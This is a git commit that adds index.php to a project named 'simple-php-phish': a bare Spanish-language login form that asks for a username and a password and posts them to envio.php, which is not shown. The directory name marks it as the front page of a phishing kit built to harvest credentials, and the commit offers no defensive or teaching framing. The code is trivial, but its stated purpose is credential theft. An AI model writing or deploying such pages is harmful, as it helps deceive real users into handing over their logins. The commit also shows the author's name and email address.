282b75ac2daa940f9f57c60ae84f7f68c2110051
FranciscoRD <francisco_renan-dt@hotmail.com>
2020-09-06 17:28:54 -0600

    Create index.php

---
+++ simple-php-phish/index.php
@@ -0,0 +1,10 @@
+<html>
+    <body>
+
+        <form action="envio.php" method="post">
+            Usuario: <input type="text" name="email"><br>
+            Contraseña: <input type="text" name="password"><br>
+            <input type="submit" value="Acceder">
+        </form>
+    </body>
+</html>
